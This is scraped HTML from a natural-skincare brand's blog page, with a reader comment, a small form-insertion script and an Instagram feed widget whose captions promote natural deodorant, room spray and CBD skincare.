+<li id="comment-4115" class="comment even thread-even depth-1"> <article id="div-comment-4115" class="comment-body"> <footer class="comment-meta"> <div class="comment-author vcard"> <img alt='' src='https://secure.gravatar.com/avatar/6fd515657b843062f9be108c95ed51e4?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6fd515657b843062f9be108c95ed51e4?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' loading='lazy'/> <b class="fn">Daniella</b> <span class="says">says:</span></div><div class="comment-metadata"> <a href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#comment-4115" data-wpel-link="internal"> <time datetime="2020-08-27T05:12:24-07:00"> August 27, 2020 at 5:12 am </time> </a></div></footer> <div class="comment-content"> <p>This is a little off topic, but could you share in what ways you sought to help your body clean up after birth? I’m in a similar situation!</p></div><div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-4115" data-commentid="4115" data-postid="6632" data-belowelement="div-comment-4115" data-respondelement="respond" data-replyto="Reply to Daniella" aria-label="Reply to Daniella">Reply</a></div></article> </li>
+</ol>
+</section>
+</main>
+<script>jQuery(document).ready(function($){
+$("<div class='klaviyo-form-VFu5KY' style='margin-bottom: 30px; font-family: 'BellMT'></div>").insertBefore(".sharedaddy");
+});</script>
+</section>
+<footer class="footer-instagram" role="complementary">
+<article class="widget_text footer-instagram-widget widget widget_custom_html" id="custom_html-2"><div class="textwidget custom-html-widget"> <div id="sb_instagram" class="sbi sbi_mob_col_auto sbi_col_7 sbi_width_resp" style="width: 100%;" data-feedid="sbi_primallypure#7" data-res="auto" data-cols="7" data-colsmobile="auto" data-num="7" data-nummobile="" data-shortcode-atts="{&quot;num&quot;:&quot;7&quot;,&quot;cols&quot;:&quot;7&quot;,&quot;imagepadding&quot;:&quot;0&quot;,&quot;imagepaddingunit&quot;:&quot;px&quot;,&quot;showheader&quot;:&quot;false&quot;,&quot;showbio&quot;:&quot;false&quot;,&quot;showcaption&quot;:&quoquot;false&quot;,&quot;showlikes&quot;:&quot;false&quot;,&quot;showbutton&quot;:&quot;false&quot;,&quot;showfollow&quot;:&quot;false&quot;,&quot;autoscroll&quot;:&quot;false&quot;,&quot;disablelightbox&quot;:&quot;true&quot;}" data-options="{&quot;grid&quot;:true,&quot;avatars&quot;:[],&quot;disablelightbox&quot;:true,&quot;colsmobile&quot;:&quot;auto&quot;,&quot;captionsize&quot;:13,&quot;captionlength&quot;:50}"> <div class="sb_instagram_header sbi_feed_type_user" style="padding-bottom: 0;"> <a href="https://www.instagram.com/" target="_blank" rel="noopener noreferrer nofollow external" title="@" class="sbi_header_link" data-wpel-link="external"> <div class="sbi_header_text sbi_no_bio"> <h3 ></h3> <p class="sbi_bio_info"> <span class="sbi_posts_count"><svg class="svg-inline--fa fa-image fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="image" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M464 448H48c-26.51 0-48-21.49-48-48V112c0-26.51 21.49-48 48-48h416c26.51 0 48 21.49 48 48v288c0 26.51-21.49 48-48 48zM112 120c-30.928 0-56 25.072-56 56s25.072 56 56 56 56-25.072 56-56-25.072-56-56-56zM64 384h384V272l-87.515-87.515c-4.686-4.686-12.284-4.686-16.971 0L208 320l-55.515-55.515c-4.686-4.686-12.284-4.686-16.971 0L64 336v48z"></path></svg>0</span> <span class="sbi_followers"><svg class="svg-inline--fa fa-user fa-w-16" style="margin-right: 3px;" aria-hidden="true" data-fa-processed="" data-prefix="fa" data-icon="user" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M96 160C96 71.634 167.635 0 256 0s160 71.634 160 160-71.635 160-160 160S96 248.366 96 160zm304 192h-28.556c-71.006 42.713-159.912 42.695-230.888 0H112C50.144 352 0 402.144 0 464v24c0 13.255 10.745 24 24 24h464c13.255 0 24-10.745 24-24v-24c0-61.856-50.144-112-112-112z"></path></svg>0</span> </p></div><div class="sbi_header_img"> <div class="sbi_header_img_hover"><svg class="sbi_new_logo fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512"> <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path> </svg></div><img src="" alt="" width="50" height="50"></div></a></div><div id="sbi_images"> <div class="sbi_item sbi_type_image sbi_new sbi_transition" id="sbi_17855226614179696" data-date="1598287541" data-numcomments="13"> <div class="sbi_photo_wrap"> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CER3y4VpSzh/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 24</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118175786_678111772796200_4099086629234004139_n.jpg?_nc_cat=108&amp;_nc_sid=8ae9d6&amp;_nc_ohc=IGOQ8FTe2eAAX_ttKZ1&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=863708933d8e5a8892758867c2d84cf0&amp;oe=5F6A1AFD" data-lightbox-sbi="" data-title="Wise words from @msrachelhollis to start your week. Whether you’re starting a new job, adopting a hobby you’ve always wanted to try, a new type of physical activity or way of eating, know that forward progress is NEVER an easy or graceful process. Own the awkwardness and keep going. 👊🏽🖤" data-video="" data-carousel="" data-id="sbi_17855226614179696" data-user="primallypure" data-url="https://www.instagram.com/p/CER3y4VpSzh/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+</a></div><a class="sbi_photo" href="https://www.instagram.com/p/CER3y4VpSzh/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118175786_678111772796200_4099086629234004139_n.jpg?_nc_cat=108&#038;_nc_sid=8ae9d6&#038;_nc_ohc=IGOQ8FTe2eAAX_ttKZ1&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=863708933d8e5a8892758867c2d84cf0&#038;oe=5F6A1AFD" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CER3y4VpSzh\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CER3y4VpSzh\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/scontent-iad3-1.cdninstagram.com\/v\/t51.29350-15\/118175786_678111772796200_4099086629234004139_n.jpg?_nc_cat=108&amp;_nc_sid=8ae9d6&amp;_nc_ohc=IGOQ8FTe2eAAX_ttKZ1&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=863708933d8e5a8892758867c2d84cf0&amp;oe=5F6A1AFD&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 17855226614179696</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="Wise words from @msrachelhollis to start your week. Whether you’re starting a new job, adopting a hobby you’ve always wanted to try, a new type of physical activity or way of eating, know that forward progress is NEVER an easy or graceful process. Own the awkwardness and keep going. 👊🏽🖤" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_image sbi_new sbi_transition" id="sbi_18113145214145508" data-date="1598229308" data-numcomments="32"> <div class="sbi_photo_wrap"> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CEQIuVuJq3_/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 24</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118168987_125707498919818_2287496421118795661_n.jpg?_nc_cat=110&amp;_nc_sid=8ae9d6&amp;_nc_ohc=d5K_WPBkJ6YAX87MTcT&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=c138f93233b4f114ff830af091653baf&amp;oe=5F6A06E5" data-lightbox-sbi="" data-title="Did you know one of the *most toxic* relationships you can have is with your deodorant? But breaking up with your drugstore deo or antiperspirant doesn’t have to be the pits. 🖤 Our in-house how-to girl, Sarah, is sharing her breakup story with her toxic deodorant and 3 tips to make it even easier! 👉🏾 Read her hilarious + incredibly insightful post on Pure Life Blog (link in bio or purelifeblog.com) for her key takeaways to navigate the transition to natural deodorant - and ultimately, a happier, healthier relationship. 🙌🏾. XO . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself" data-video="" data-carousel="" data-id="sbi_18113145214145508" data-user="primallypure" data-url="https://www.instagram.com/p/CEQIuVuJq3_/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+</a></div><a class="sbi_photo" href="https://www.instagram.com/p/CEQIuVuJq3_/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118168987_125707498919818_2287496421118795661_n.jpg?_nc_cat=110&#038;_nc_sid=8ae9d6&#038;_nc_ohc=d5K_WPBkJ6YAX87MTcT&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=c138f93233b4f114ff830af091653baf&#038;oe=5F6A06E5" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CEQIuVuJq3_\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CEQIuVuJq3_\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/scontent-iad3-1.cdninstagram.com\/v\/t51.29350-15\/118168987_125707498919818_2287496421118795661_n.jpg?_nc_cat=110&amp;_nc_sid=8ae9d6&amp;_nc_ohc=d5K_WPBkJ6YAX87MTcT&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=c138f93233b4f114ff830af091653baf&amp;oe=5F6A06E5&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 18113145214145508</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="Did you know one of the *most toxic* relationships you can have is with your deodorant? But breaking up with your drugstore deo or antiperspirant doesn’t have to be the pits. 🖤 Our in-house how-to girl, Sarah, is sharing her breakup story with her toxic deodorant and 3 tips to make it even easier! 👉🏾 Read her hilarious + incredibly insightful post on Pure Life Blog (link in bio or purelifeblog.com) for her key takeaways to navigate the transition to natural deodorant - and ultimately, a happier, healthier relationship. 🙌🏾. XO . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_video sbi_new sbi_transition" id="sbi_17874853057843131" data-date="1598123695" data-numcomments="3"> <div class="sbi_photo_wrap"> <svg style="color: rgba(255,255,255,1)" class="svg-inline--fa fa-play fa-w-14 sbi_playbtn" aria-hidden="true" data-fa-processed="" data-prefix="fa" data-icon="play" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-208c31.4-18.5 31.5-64.1 0-82.6z"></path></svg> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CEM_Qdxp9YE/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 22</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117972026_440602593563699_1901467719348931061_n.jpg?_nc_cat=103&amp;_nc_sid=8ae9d6&amp;_nc_ohc=BKYsyUkY4OgAX9TW3Yy&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=95810ffd5dc5ce01feeb736e2fccf4f2&amp;oe=5F69FD8D" data-lightbox-sbi="" data-title="A spritz of happiness and health for your home. 🌿 Bergamot, Sweet Marjoram, Tangerine, Spearmint, and Neroli Essential Oils not only improve the health of your home but also elevate your mood, encourage focus and alleviate stress - something we could all use a little bit more of these days. When and where do you spritz your Summer Room Spray? ☀️👇🏾 . . . #primallypure #pureingredientsrealresults #nontoxichome #naturalhomeproducts #organichomeproducts #organichandsoap #essentialoilblend #essentialoildiffuserblend #organicroomspray #welcomehome" data-video="https://video-iad3-1.cdninstagram.com/v/t50.2886-16/117948493_668305560710454_4445858871119691103_n.mp4?_nc_cat=104&amp;vs=17877727237803939_3002492156&amp;_nc_vs=HBkcFQAYJEdFM0FCd2MyTFl3RDBsOENBRl85bTQ0VzNiSTlia1lMQUFBRhUAAsgBACgAGAAbAYgHdXNlX29pbAExFQAAGAAWxsStrtfswT8VAigCQzMsF0BEZocrAgxKGBJkYXNoX2Jhc2VsaW5lXzFfdjERAHXqBwA%3D&amp;_nc_sid=59939d&amp;efg=eyJ2ZW5jb2RlX3RhZyI6InZ0c192b2RfdXJsZ2VuLjcyMC5mZWVkIn0%3D&amp;_nc_ohc=Itxsoy2QidgAX9Pk9tl&amp;_nc_ht=video-iad3-1.cdninstagram.com&amp;oh=064c842eb941bf294f326bc6f28ecd01&amp;oe=5F6B53E4&amp;_nc_rid=01fdeec963" data-carousel="" data-id="sbi_17874853057843131" data-user="primallypure" data-url="https://www.instagram.com/p/CEM_Qdxp9YE/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+<svg style="color: rgba(255,255,255,1)" class="svg-inline--fa fa-play fa-w-14 sbi_playbtn" aria-hidden="true" data-fa-processed="" data-prefix="fa" data-icon="play" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-208c31.4-18.5 31.5-64.1 0-82.6z"></path></svg>            </a></div><a class="sbi_photo" href="https://www.instagram.com/p/CEM_Qdxp9YE/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117972026_440602593563699_1901467719348931061_n.jpg?_nc_cat=103&#038;_nc_sid=8ae9d6&#038;_nc_ohc=BKYsyUkY4OgAX9TW3Yy&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=95810ffd5dc5ce01feeb736e2fccf4f2&#038;oe=5F69FD8D" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CEM_Qdxp9YE\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CEM_Qdxp9YE\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/www.instagram.com\/p\/CEM_Qdxp9YE\/media?size=l&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 17874853057843131</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="A spritz of happiness and health for your home. 🌿 Bergamot, Sweet Marjoram, Tangerine, Spearmint, and Neroli Essential Oils not only improve the health of your home but also elevate your mood, encourage focus and alleviate stress - something we could all use a little bit more of these days. When and where do you spritz your Summer Room Spray? ☀️👇🏾 . . . #primallypure #pureingredientsrealresults #nontoxichome #naturalhomeproducts #organichomeproducts #organichandsoap #essentialoilblend #essentialoildiffuserblend #organicroomspray #welcomehome" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_image sbi_new sbi_transition" id="sbi_17846783873323000" data-date="1598028555" data-numcomments="13"> <div class="sbi_photo_wrap"> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CEKJ0XKJtHE/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 21</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118287796_320168332468068_5166777875633331576_n.jpg?_nc_cat=103&amp;_nc_sid=8ae9d6&amp;_nc_ohc=6Kiww58m9CgAX_BhI8T&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=a4508924cf92d66ec5a6f7b45ba1da83&amp;oe=5F68DB88" data-lightbox-sbi="" data-title="Struggling with acne or signs of aging? Here&#039;s the solution: CBD. ✨ This skin superfood not only soothes inflammation + helps heal hormonal acne, it provides *visible* results for aging skin. The potent antioxidants found in CBD Oil work to counteract free-radical damage helping to diminish fine lines, dullness and uneven skin tone. 🙌🏾 Anyone else out there as obsessed with CBD as we are?! . . . #primallypure #cleanbeauty #organicbeauty #greenbeauty #safeskincare #naturalbeauty #naturalskincare #nontoxic #beauty #healthyskin #selfcare #organicskincare #cbdoil #fullspectrumcbd #cbdinskincare #topicalcbd #naturalacnetreatment" data-video="" data-carousel="" data-id="sbi_17846783873323000" data-user="primallypure" 